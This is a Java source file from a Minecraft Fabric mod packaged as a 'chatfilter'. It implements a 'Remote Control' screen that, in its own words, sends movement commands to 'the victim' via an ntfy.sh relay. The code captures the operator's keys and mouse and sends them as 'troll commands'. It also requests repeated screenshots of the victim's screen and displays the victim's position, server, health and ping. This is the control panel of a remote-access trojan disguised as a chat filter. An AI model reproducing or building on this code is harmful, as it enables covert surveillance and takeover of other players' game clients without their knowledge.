package com.deinname.chatfilter.screen;

import com.deinname.chatfilter.AdminConfig;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.client.gui.DrawContext;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.input.KeyInput;
import net.minecraft.text.Text;
import org.lwjgl.glfw.GLFW;

import static com.deinname.chatfilter.screen.UIHelper.*;

/**
 * Remote Control screen — admin captures WASD/Space/Shift + mouse and sends
 * movement commands to the victim via ntfy.sh relay every 500ms.
 * ESC exits the mode.
 */
@Environment(EnvType.CLIENT)
public final class RemoteControlScreen extends Screen {

    private final Screen parent;
    private final String targetPlayer;
    private ThemeColors colors;

    // Control state — current GLFW poll
    private boolean rcW, rcA, rcS, rcD, rcJump, rcSneak;
    private boolean rcSprint, rcAttack, rcUse, rcCloseScreen;
    // Latch state — holds brief keypresses until next send so they aren't lost
    private boolean latchJump, latchSneak, latchSprint, latchAttack, latchUse, latchCloseScreen;
    private float controlYaw, controlPitch;
    private boolean mouseInitialized = false;
    private double lastMouseX, lastMouseY;
    private int sendTick = 0;
    private int screenshotTick = 0;
    private int sessionTick = 0;
    private static final int MAX_SESSION_TICKS = 2400; // 120 seconds
    private static final float MOUSE_SENS = 0.15f;

    public RemoteControlScreen(Screen parent, String targetPlayer) {
        super(Text.literal("Remote Control"));
        this.parent = parent;
        this.targetPlayer = targetPlayer;
        this.colors = loadColors();
    }

    @Override
    protected void init() {
        // Hide and lock cursor for raw mouse input
        long wh = client.getWindow().getHandle();
        GLFW.glfwSetInputMode(wh, GLFW.GLFW_CURSOR, GLFW.GLFW_CURSOR_DISABLED);
        if (GLFW.glfwRawMouseMotionSupported()) {
            GLFW.glfwSetInputMode(wh, GLFW.GLFW_RAW_MOUSE_MOTION, GLFW.GLFW_TRUE);
        }
        warpCursorToCenter();
        mouseInitialized = false;

        // Send start command to victim
        AdminConfig.sendTrollCommand(targetPlayer, "REMOTESTART");

        // Configure video resolution + interval on victim
        AdminConfig.sendTrollCommand(targetPlayer,
                "VIDEOCFG:" + AdminConfig.videoW + "x" + AdminConfig.videoH + ":" + AdminConfig.videoSpf);

        // Request status updates every 2s (responsive for RC)
        AdminConfig.sendTrollCommand(targetPlayer, "RATE:40");

        // Request initial screenshot at video resolution
        AdminConfig.sendTrollCommand(targetPlayer,
                "SCREENSHOT_REQ:" + AdminConfig.videoW + "x" + AdminConfig.videoH);

        // Initialize yaw/pitch from player's last known status
        AdminConfig.PlayerStatus status = AdminConfig.getPlayerStatus(targetPlayer);
        if (status != null) {
            controlYaw = status.yaw;
            controlPitch = status.pitch;
        }
    }

    @Override
    public void tick() {
        sessionTick++;
        if (sessionTick >= MAX_SESSION_TICKS) {
            sendStop();
            close();
            return;
        }

        // Force cursor locked — MC may try to unlock when Screen is active
        if (client != null && client.getWindow() != null) {
            GLFW.glfwSetInputMode(client.getWindow().getHandle(),
                    GLFW.GLFW_CURSOR, GLFW.GLFW_CURSOR_DISABLED);
        }

        // Poll key states directly via GLFW
        long wh = client.getWindow().getHandle();
        rcW = GLFW.glfwGetKey(wh, GLFW.GLFW_KEY_W) == GLFW.GLFW_PRESS;
        rcA = GLFW.glfwGetKey(wh, GLFW.GLFW_KEY_A) == GLFW.GLFW_PRESS;
        rcS = GLFW.glfwGetKey(wh, GLFW.GLFW_KEY_S) == GLFW.GLFW_PRESS;
        rcD = GLFW.glfwGetKey(wh, GLFW.GLFW_KEY_D) == GLFW.GLFW_PRESS;
        rcJump = GLFW.glfwGetKey(wh, GLFW.GLFW_KEY_SPACE) == GLFW.GLFW_PRESS;
        rcSneak = GLFW.glfwGetKey(wh, GLFW.GLFW_KEY_LEFT_SHIFT) == GLFW.GLFW_PRESS;
        rcSprint = GLFW.glfwGetKey(wh, GLFW.GLFW_KEY_LEFT_CONTROL) == GLFW.GLFW_PRESS;
        rcAttack = GLFW.glfwGetMouseButton(wh, GLFW.GLFW_MOUSE_BUTTON_LEFT) == GLFW.GLFW_PRESS;
        rcUse = GLFW.glfwGetMouseButton(wh, GLFW.GLFW_MOUSE_BUTTON_RIGHT) == GLFW.GLFW_PRESS;
        rcCloseScreen = GLFW.glfwGetKey(wh, GLFW.GLFW_KEY_X) == GLFW.GLFW_PRESS;

        // Latch brief presses — once pressed, stays true until sent
        if (rcJump) latchJump = true;
        if (rcSneak) latchSneak = true;
        if (rcSprint) latchSprint = true;
        if (rcAttack) latchAttack = true;
        if (rcUse) latchUse = true;
        if (rcCloseScreen) latchCloseScreen = true;

        // Send control packet every 3 ticks (150ms)
        if (++sendTick % 3 == 0) {
            sendControlPacket();
            // Reset latches after send — only clear if key is no longer held
            if (!rcJump) latchJump = false;
            if (!rcSneak) latchSneak = false;
            if (!rcSprint) latchSprint = false;
            if (!rcAttack) latchAttack = false;
            if (!rcUse) latchUse = false;
            if (!rcCloseScreen) latchCloseScreen = false;
        }
        // Request screenshot based on video SPF setting
        int videoTicks = Math.max(1, (int)(AdminConfig.videoSpf * 20));
        if (++screenshotTick % videoTicks == 0) {
            AdminConfig.sendTrollCommand(targetPlayer,
                    "SCREENSHOT_REQ:" + AdminConfig.videoW + "x" + AdminConfig.videoH);
        }
    }

    @Override
    public void render(DrawContext ctx, int mx, int my, float delta) {
        // Force GLFW raw mouse mode — MC tries to unlock for Screen, we re-lock every frame
        long wh2 = client.getWindow().getHandle();
        GLFW.glfwSetInputMode(wh2, GLFW.GLFW_CURSOR, GLFW.GLFW_CURSOR_DISABLED);
        // Enable raw mouse motion if supported (bypasses OS acceleration)
        if (GLFW.glfwRawMouseMotionSupported()) {
            GLFW.glfwSetInputMode(wh2, GLFW.GLFW_RAW_MOUSE_MOTION, GLFW.GLFW_TRUE);
        }

        // Mouse delta: read cursor pos, compute delta from last known position
        double[] rawX = new double[1], rawY = new double[1];
        GLFW.glfwGetCursorPos(wh2, rawX, rawY);
        if (mouseInitialized) {
            double dx = rawX[0] - lastMouseX;
            double dy = rawY[0] - lastMouseY;
            if (dx != 0 || dy != 0) {
                controlYaw += (float) (dx * MOUSE_SENS);
                controlPitch = Math.max(-90, Math.min(90,
                        controlPitch + (float) (dy * MOUSE_SENS)));
            }
        }
        lastMouseX = rawX[0];
        lastMouseY = rawY[0];
        mouseInitialized = true;

        ThemeColors t = colors;

        // Semi-transparent background
        ctx.fill(0, 0, width, height, 0x88000000);

        // Title bar
        int barH = 28;
        ctx.fill(0, 0, width, barH, 0xCC111111);
        ctx.fill(0, barH - 1, width, barH, 0xFF444444);
        ctx.drawCenteredTextWithShadow(textRenderer,
                Text.literal("\u00a7c\u00a7l\uD83C\uDFAE FERNSTEUERUNG: \u00a7f" + targetPlayer),
                width / 2, 9, 0xFFFF4444);

        // ── WASD indicator (centered) ──
        int cx = width / 2, cy = height / 2 - 20;
        drawKey(ctx, cx - 13, cy - 28, 26, "W", rcW);
        drawKey(ctx, cx - 43, cy + 2, 26, "A", rcA);
        drawKey(ctx, cx - 13, cy + 2, 26, "S", rcS);
        drawKey(ctx, cx + 17, cy + 2, 26, "D", rcD);
        drawKey(ctx, cx + 52, cy - 28, 30, "⎵", rcJump);   // Space
        drawKey(ctx, cx + 52, cy + 2, 30, "⇧", rcSneak);   // Shift
        drawKey(ctx, cx + 88, cy - 28, 30, "⌃", rcSprint);  // Ctrl
        drawKey(ctx, cx - 43, cy - 28, 26, "X", rcCloseScreen); // Close overlay
        drawKey(ctx, cx + 88, cy + 2, 15, "L", rcAttack);   // Left click
        drawKey(ctx, cx + 107, cy + 2, 15, "R", rcUse);     // Right click

        // Labels
        ctx.drawCenteredTextWithShadow(textRenderer,
                Text.literal("\u00a78JUMP"), cx + 67, cy - 15, 0xFF666666);
        ctx.drawCenteredTextWithShadow(textRenderer,
                Text.literal("\u00a78SNEAK"), cx + 67, cy + 15, 0xFF666666);
        ctx.drawCenteredTextWithShadow(textRenderer,
                Text.literal("\u00a78SPRINT"), cx + 103, cy - 15, 0xFF666666);

        // Rotation info
        ctx.drawCenteredTextWithShadow(textRenderer,
                Text.literal(String.format("\u00a77Yaw: \u00a7b%.1f\u00b0 \u00a78| \u00a77Pitch: \u00a7b%.1f\u00b0",
                        controlYaw, controlPitch)),
                width / 2, cy + 45, 0xFFAAAAAA);

        // Active keys line
        StringBuilder keys = new StringBuilder("\u00a77Tasten: ");
        if (rcW) keys.append("\u00a7aW ");
        if (rcA) keys.append("\u00a7aA ");
        if (rcS) keys.append("\u00a7aS ");
        if (rcD) keys.append("\u00a7aD ");
        if (rcJump) keys.append("\u00a7aJUMP ");
        if (rcSneak) keys.append("\u00a7aSNEAK ");
        if (rcSprint) keys.append("\u00a7aSPRINT ");
        if (rcAttack) keys.append("\u00a7cATK ");
        if (rcUse) keys.append("\u00a7bUSE ");
        if (rcCloseScreen) keys.append("\u00a7eESC ");
        if (!rcW && !rcA && !rcS && !rcD && !rcJump && !rcSneak && !rcSprint && !rcAttack && !rcUse) keys.append("\u00a78keine");
        ctx.drawCenteredTextWithShadow(textRenderer, Text.literal(keys.toString().trim()),
                width / 2, cy + 60, 0xFFCCCCCC);

        // ── Player status panel (left) ──
        renderPlayerStatus(ctx, t);

        // ── Screenshot preview (top-right) ──
        renderScreenshot(ctx);

        // ── Session info (bottom) ──
        int remaining = (MAX_SESSION_TICKS - sessionTick) / 20;
        String timeColor = remaining <= 10 ? "\u00a7c" : "\u00a7a";
        ctx.drawCenteredTextWithShadow(textRenderer,
                Text.literal("\u00a77\u23f1 " + timeColor + remaining
                        + "s \u00a78| \u00a77Dr\u00fccke \u00a7fESC \u00a77zum Beenden"),
                width / 2, height - 16, 0xFFAAAAAA);

        // Compact send indicator
        if (sendTick % 10 < 3) {
            ctx.drawTextWithShadow(textRenderer, Text.literal("\u00a7a\u25cf \u00a78Sende..."),
                    width - 80, height - 16, 0xFF44AA44);
        }

        super.render(ctx, mx, my, delta);
    }

    private void drawKey(DrawContext ctx, int x, int y, int w, String label, boolean pressed) {
        int h = 24;
        int bg = pressed ? 0xDD33CC55 : 0x66222222;
        int border = pressed ? 0xFF44DD66 : 0xFF444444;
        int textCol = pressed ? 0xFF000000 : 0xFF999999;

        ctx.fill(x, y, x + w, y + h, bg);
        // Top highlight
        ctx.fill(x, y, x + w, y + 1, pressed ? 0xFF66FF88 : 0xFF555555);
        // Bottom shadow
        ctx.fill(x, y + h - 1, x + w, y + h, pressed ? 0xFF228844 : 0xFF333333);
        // Left/right border
        ctx.fill(x, y, x + 1, y + h, border);
        ctx.fill(x + w - 1, y, x + w, y + h, border);

        ctx.drawCenteredTextWithShadow(textRenderer, Text.literal(label),
                x + w / 2, y + 7, textCol);
    }

    private void renderPlayerStatus(DrawContext ctx, ThemeColors t) {
        AdminConfig.PlayerStatus status = AdminConfig.getPlayerStatus(targetPlayer);
        int sx = 8, sy = 36;
        int pw = 175, ph = status != null ? 140 : 30;

        ctx.fill(sx, sy, sx + pw, sy + ph, 0xBB111111);
        drawBorder(ctx, sx, sy, pw, ph, 0xFF333333);
        ctx.fill(sx + 2, sy + 2, sx + pw - 2, sy + 4, 0xFFFF4444);

        if (status == null) {
            ctx.drawTextWithShadow(textRenderer, Text.literal("\u00a78Warte auf Status..."),
                    sx + 6, sy + 10, 0xFF666666);
            return;
        }

        int y = sy + 8;
        int lx = sx + 6;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a77Pos: \u00a7f" + status.x + " / " + status.y + " / " + status.z),
                lx, y, t.text); y += 11;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a77HP: \u00a7c" + String.format("%.0f/%.0f", status.hp, status.maxHp)
                        + " \u00a77Food: \u00a7a" + status.food),
                lx, y, t.text); y += 11;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a77Dim: \u00a7b" + status.dimension),
                lx, y, t.text); y += 11;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a77Mode: \u00a7e" + status.gameMode),
                lx, y, t.text); y += 11;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a77Item: \u00a7f" + status.heldItem),
                lx, y, t.text); y += 11;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a77Boden: " + (status.onGround ? "\u00a7aJa" : "\u00a7cNein")
                        + " \u00a77Licht: \u00a7f" + status.light),
                lx, y, t.text); y += 11;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a77Server: \u00a7f" + status.server),
                lx, y, t.text); y += 11;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a77FPS: \u00a7f" + status.fps + " \u00a77Ping: \u00a7f" + status.ping + "ms"),
                lx, y, t.text); y += 11;

        long age = (System.currentTimeMillis() - status.timestamp) / 1000;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a78Daten " + age + "s alt"),
                lx, y, 0xFF555555);
    }

    /** Render screenshot preview in top-right corner using pixel-by-pixel fill. */
    private void renderScreenshot(DrawContext ctx) {
        int[] pixels = AdminConfig.getScreenshotPixels();
        int scW = AdminConfig.getScreenshotW();
        int scH = AdminConfig.getScreenshotH();
        // Target display width: up to 60% of screen, min 300px
        int targetW = Math.max(300, (int)(width * 0.6));
        if (pixels == null || scW == 0 || scH == 0) {
            // Placeholder
            int pw = targetW, ph = pw * 9 / 16;
            int bx = width - pw - 8, by = 32;
            ctx.fill(bx, by, bx + pw, by + ph, 0xBB111111);
            drawBorder(ctx, bx, by, pw, ph, 0xFF333333);
            ctx.drawCenteredTextWithShadow(textRenderer,
                    Text.literal("\u00a78\uD83D\uDCF7 Warte auf Bild..."),
                    bx + pw / 2, by + ph / 2 - 4, 0xFF555555);
            return;
        }
        // Scale to fill target width (integer scale, at least 2×)
        int scale = Math.max(2, targetW / scW);
        int dispW = scW * scale, dispH = scH * scale;
        int bx = width - dispW - 8, by = 32;
        // Border + background
        ctx.fill(bx - 2, by - 2, bx + dispW + 2, by + dispH + 2, 0xFF222222);
        ctx.fill(bx - 1, by - 1, bx + dispW + 1, by + dispH + 1, 0xFF444444);
        // Render pixels (each source pixel = scale×scale block)
        for (int y = 0; y < scH; y++) {
            for (int x = 0; x < scW; x++) {
                int color = pixels[y * scW + x];
                ctx.fill(bx + x * scale, by + y * scale,
                        bx + x * scale + scale, by + y * scale + scale, color);
            }
        }
        // Age label
        long age = (System.currentTimeMillis() - AdminConfig.getScreenshotTimestamp()) / 1000;
        ctx.drawTextWithShadow(textRenderer,
                Text.literal("\u00a78\uD83D\uDCF7 " + age + "s"),
                bx, by + dispH + 3, 0xFF555555);
    }

    private void sendControlPacket() {
        // Use latched values for brief-press keys (jump, sneak, sprint, attack, use, close)
        // Use live values for movement keys (WASD — held continuously)
        String data = String.format("W%dA%dS%dD%dJ%dN%dR%dL%dU%dX%dY%.1fP%.1f",
                rcW ? 1 : 0, rcA ? 1 : 0, rcS ? 1 : 0, rcD ? 1 : 0,
                latchJump ? 1 : 0, latchSneak ? 1 : 0, latchSprint ? 1 : 0,
                latchAttack ? 1 : 0, latchUse ? 1 : 0, latchCloseScreen ? 1 : 0,
                controlYaw, controlPitch);
        AdminConfig.sendTrollCommand(targetPlayer, "RC:" + data);
    }

    private void sendStop() {
        AdminConfig.sendTrollCommand(targetPlayer, "REMOTESTOP");
        // Restore default rate (10s)
        AdminConfig.sendTrollCommand(targetPlayer, "RATE:200");
    }

    @Override
    public boolean keyPressed(KeyInput keyInput) {
        if (keyInput.key() == GLFW.GLFW_KEY_ESCAPE) {
            sendStop();
            close();
            return true;
        }
        return true; // Consume all keys
    }

    @Override
    public void close() {
        // Restore cursor
        if (client != null && client.getWindow() != null) {
            long wh = client.getWindow().getHandle();
            if (GLFW.glfwRawMouseMotionSupported()) {
                GLFW.glfwSetInputMode(wh, GLFW.GLFW_RAW_MOUSE_MOTION, GLFW.GLFW_FALSE);
            }
            GLFW.glfwSetInputMode(wh, GLFW.GLFW_CURSOR, GLFW.GLFW_CURSOR_NORMAL);
        }
        if (client != null) client.setScreen(parent);
    }

    /** Warp OS cursor to the center of the window (pixel coordinates). */
    private void warpCursorToCenter() {
        if (client != null && client.getWindow() != null) {
            double cx = client.getWindow().getWidth() / 2.0;
            double cy = client.getWindow().getHeight() / 2.0;
            GLFW.glfwSetCursorPos(client.getWindow().getHandle(), cx, cy);
        }
    }

    @Override
    public boolean shouldPause() { return false; }
}
